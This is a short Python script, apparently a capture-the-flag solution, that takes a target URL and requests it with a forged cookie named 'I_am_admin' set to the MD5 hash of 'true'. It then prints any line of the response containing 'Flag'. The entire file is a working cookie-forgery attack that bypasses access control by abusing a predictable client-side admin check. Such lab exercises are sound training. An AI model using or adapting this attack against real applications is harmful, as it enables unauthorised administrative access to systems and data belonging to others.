import requests
import sys
import hashlib
import re

def session_hijack(url):
        str2hash = "true"
        hash = hashlib.md5(str2hash.encode())

        payload = {
            "Cookie": f"I_am_admin={hash.hexdigest()}"
        }
        response = requests.get(url, headers=payload)

        if response.status_code != 200:
                sys.exit("Request failed, check your URL")

        for line in response.text.splitlines():
            if 'Flag' in line:
                print(line)        

if __name__ == "__main__":
        if len(sys.argv) != 2:
                sys.exit("Usage: python3 session_hijack.py  <URL>")
        else:
                url = sys.argv[1]
                session_hijack(url)

